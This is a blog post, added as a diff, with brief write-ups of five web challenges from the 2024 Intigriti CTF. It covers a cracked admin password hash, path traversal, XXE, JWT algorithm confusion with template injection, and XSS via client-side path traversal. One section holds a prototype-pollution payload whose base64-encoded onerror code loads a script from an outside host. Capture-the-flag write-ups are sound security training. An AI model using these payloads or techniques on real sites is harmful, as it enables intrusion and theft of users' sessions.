@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>2024 Intigrity CTF, some Web solution | sunriseXu’s bug hunting journey</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="2024 Intigrity CTF, some Web solution" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Pizza Paradise, 100p, 395 solves" />
+<meta property="og:description" content="Pizza Paradise, 100p, 395 solves" />
+<link rel="canonical" href="http://localhost:4000/ctf/2024/11/20/web.html" />
+<meta property="og:url" content="http://localhost:4000/ctf/2024/11/20/web.html" />
+<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-11-20T10:31:06+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="2024 Intigrity CTF, some Web solution" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-11-20T10:31:06+08:00","datePublished":"2024-11-20T10:31:06+08:00","description":"Pizza Paradise, 100p, 395 solves","headline":"2024 Intigrity CTF, some Web solution","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/ctf/2024/11/20/web.html"},"url":"http://localhost:4000/ctf/2024/11/20/web.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">2024 Intigrity CTF, some Web solution</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-11-20T10:31:06+08:00" itemprop="datePublished">Nov 20, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="pizza-paradise-100p-395-solves">Pizza Paradise, 100p, 395 solves</h2>
+
+<ol>
+  <li>
+    <p>Find <code class="language-plaintext highlighter-rouge">robots.txt</code> in host page, <code class="language-plaintext highlighter-rouge">https://pizzaparadise.ctf.intigriti.io/robots.txt</code></p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> User-agent: *
+ Disallow: /secret_172346606e1d24062e891d537e917a90.html
+ Disallow: /assets/
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Open secret login page, find admin username and password hash in client js. <code class="language-plaintext highlighter-rouge">https://pizzaparadise.ctf.intigriti.io/assets/js/auth.js</code></p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> const validUsername = "agent_1337";
+ const validPasswordHash = "91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac";
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Crack sha256 using online tools <a href="https://passwordrecovery.io/sha256/">https://passwordrecovery.io/sha256/</a>. And get password <code class="language-plaintext highlighter-rouge">intel420</code></p>
+  </li>
+  <li>
+    <p>Login with valid username and password. After login using image download path traversal to leak php file, there is flag!</p>
+  </li>
+</ol>
+
+<h2 id="biocorp-100p-389-solves">BioCorp, 100p, 389 solves</h2>
+
+<ol>
+  <li>Simple XXE to read flag, too simple</li>
+</ol>
+
+<h2 id="cat-club-100p-130-solves">Cat Club, 100p, 130 solves</h2>
+
+<ol>
+  <li>
+    <p>JWT algorithm confusion attack, <a href="https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion">portswigger lab</a>. Using jwt attack to change username.</p>
+  </li>
+  <li>
+    <p>The changed username is injected to pug template, so just change username to <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs">SSTI payload</a> to RCE to read the flag.txt.</p>
+  </li>
+</ol>
+
+<h2 id="safenotes-20-218p-43-solves">SafeNotes 2.0, 218p, 43 solves</h2>
+
+<ol>
+  <li>
+    <p>Users can create note with html but sanitized by Dompurify. But in <code class="language-plaintext highlighter-rouge">logNoteAccess</code> function, <code class="language-plaintext highlighter-rouge">const currentUsername = document.getElementById("username").innerText;</code> is vulnerable to read our payload, so <code class="language-plaintext highlighter-rouge">username</code> can be controled.</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> function logNoteAccess(noteId, content) {
+         // Read the current username, maybe we need to ban them?
+         const currentUsername = document.getElementById("username").innerText;
+         const username = currentUsername || urlParams.get("name");
+
+         // Just in case, it seems like people can do anything with the client-side!!
+         const sanitizedUsername = decodeURIComponent(username).replace(/\.\.[\/\\]/g, '');
+
+         fetch("/api/notes/log/" + sanitizedUsername, {
+             method: "POST",
+             headers: {
+                 "Content-Type": "application/json",
+                 "X-CSRFToken": csrf_token,
+             },
+             body: JSON.stringify({
+                 name: username,
+                 note_id: noteId,
+                 content: content
+             }),
+         })
+             .then(response =&gt; response.json())
+             .then(data =&gt; {
+                 // Does the log entry data look OK?
+                 document.getElementById("debug-content").outerHTML = JSON.stringify(data, null, 2)
+                 document.getElementById("debug-content-section").style.display = "block";
+             })
+             .catch(error =&gt; console.error("Logging failed:", error));
+
+     }
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Bypass regex filter: <code class="language-plaintext highlighter-rouge">const sanitizedUsername = decodeURIComponent(username).replace(/\.\.[\/\\]/g, '');
+</code>. Using <code class="language-plaintext highlighter-rouge">....//</code> to bypass filter, so we can get <code class="language-plaintext highlighter-rouge">../</code>. Therefore, using client side path traversal, we made fetch to another api with will return our manipulated username. <code class="language-plaintext highlighter-rouge">fetch("/api/notes/log/" + sanitizedUsername) =&gt;fetch("/contact")</code>.</p>
+  </li>
+  <li>
+    <p>XSS sink, create div with id <code class="language-plaintext highlighter-rouge">debug-content</code>. and the data is containing our xss payload.</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> document.getElementById("debug-content").outerHTML = JSON.stringify(data, null, 2)
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h2 id="workbreak-400p-26-solve">WorkBreak, 400p, 26 solve</h2>
+
+<ol>
+  <li>
+    <p>Post payload using api <code class="language-plaintext highlighter-rouge">https://workbreak-0.ctf.intigriti.io/api/user/settings</code>:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> {"name":"Anon","phone":"","position":"","__proto__":{"tasks":[{"date":"2024-11-20","tasksCompleted":"&lt;img src=x onerror=eval(atob('dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwpzY3JpcHQuc3JjID0gImh0dHBzOi8vY2VoZTcwMTAucmVxdWVzdHJlcG8uY29tIjsKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOw=='))&gt;"}]}}
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Client side prototype pollution, in client side, profile will read our data above, noting that <code class="language-plaintext highlighter-rouge">__proto__</code> is read, chain with <code class="language-plaintext highlighter-rouge">Object.assign</code> we can pollute the <code class="language-plaintext highlighter-rouge">userSettings</code> object, so this object is containing <code class="language-plaintext highlighter-rouge">tasks</code> field now.</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> const userSettings = Object.assign(
+                 { name: "", phone: "", position: "" },
+                 profileData.assignedInfo
+             );
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Due to insecure iframe postmessage, we can send xss payload to iframe. Also, the xss in iframe will send xss payload back to parent, triggering parent xss.</p>
+  </li>
+</ol>
+
+  </div><a class="u-url" href="/ctf/2024/11/20/web.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
